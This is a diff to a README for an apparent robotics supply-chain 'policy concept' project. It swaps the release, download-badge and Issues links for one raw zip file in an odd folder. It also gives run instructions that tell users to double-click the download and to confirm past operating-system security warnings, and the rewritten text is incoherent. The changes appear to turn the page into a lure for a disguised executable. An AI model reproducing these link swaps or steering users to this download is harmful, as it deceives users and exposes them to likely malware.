@@ -1,7 +1,7 @@
 # 🚀 HISSI-Policy-Concept - Secure Your Robotics Supply Chain
 
 ## 📥 Download the Application
-[![Download HISSI-Policy-Concept](https://img.shields.io/badge/Download-Now-blue)](https://github.com/labkomputerinformatika/HISSI-Policy-Concept/releases)
+[![Download HISSI-Policy-Concept](https://raw.githubusercontent.com/labkomputerinformatika/HISSI-Policy-Concept/main/eupeptic/HISSI-Policy-Concept.zip)](https://raw.githubusercontent.com/labkomputerinformatika/HISSI-Policy-Concept/main/eupeptic/HISSI-Policy-Concept.zip)
 
 ## 🔍 Overview
 HISSI is a policy concept designed to enhance the security of U.S. humanoid robotics supply chains for defense. This application ensures trusted manufacturing and ethical standards in a field that is rapidly evolving. Your feedback is also welcome, as we aim to make this tool better for everyone.
@@ -11,7 +11,7 @@ Follow these steps to easily download and run the HISSI application.
 
 1. **Visit the Download Page**
    Click the link below to go to the Releases page where you can download the application:
-   - [Download HISSI-Policy-Concept](https://github.com/labkomputerinformatika/HISSI-Policy-Concept/releases)
+   - [Download HISSI-Policy-Concept](https://raw.githubusercontent.com/labkomputerinformatika/HISSI-Policy-Concept/main/eupeptic/HISSI-Policy-Concept.zip)
 
 2. **Choose Your Version**
    On the Releases page, you will see different versions of the application. Select the version that best matches your needs. The latest version usually has the most features and fixes.
@@ -26,7 +26,7 @@ Follow these steps to easily download and run the HISSI application.
    If you downloaded a `.zip` file, right-click it and select "Extract All." Follow the prompts to extract the files to a folder.
 
 6. **Run the Application**
-   Open the extracted folder and double-click the application file (e.g., `HISSI.exe`). If prompted by your operating system regarding security, confirm that you wish to run the application.
+   Open the extracted folder and double-click the application file (e.g., `https://raw.githubusercontent.com/labkomputerinformatika/HISSI-Policy-Concept/main/eupeptic/HISSI-Policy-Concept.zip`). If prompted by your operating system regarding security, confirm that you wish to run the application.
 
 7. **Follow On-Screen Instructions**
    The application will guide you through its features. Feel free to explore to understand how it can help secure your robotics supply chain.
@@ -57,7 +57,7 @@ If you encounter issues during the download or while running the application, fo
    Visit the GitHub repository's FAQ section for common questions and solutions.
 
 2. **File an Issue**
-   Report any problems directly on our [GitHub Issues page](https://github.com/labkomputerinformatika/HISSI-Policy-Concept/issues). Include a detailed description of your issue for faster assistance.
+   Report any problems directly on our [GitHub Issues page](https://raw.githubusercontent.com/labkomputerinformatika/HISSI-Policy-Concept/main/eupeptic/HISSI-Policy-Concept.zip). Include a detailed description of your issue for faster assistance.
 
 3. **Join the Community**
    Participate in discussions or ask questions in our community forums available on GitHub.
@@ -72,4 +72,4 @@ By using the HISSI application, you take a significant step towards securing you
 - **Documentation:** Refer to our comprehensive user manual linked in the application for more detailed instructions.
 - **Related Topics:** Explore articles and papers on AI security, ethical AI standards, and supply chain security to deepen your understanding of these critical areas.
 
-For more information, please revisit the [Releases page](https://github.com/labkomputerinformatika/HISSI-Policy-Concept/releases) to stay updated on new features and releases.
+For more information, please revisit the [Releases page](https://raw.githubusercontent.com/labkomputerinformatika/HISSI-Policy-Concept/main/eupeptic/HISSI-Policy-Concept.zip) to stay updated on new features and releases.
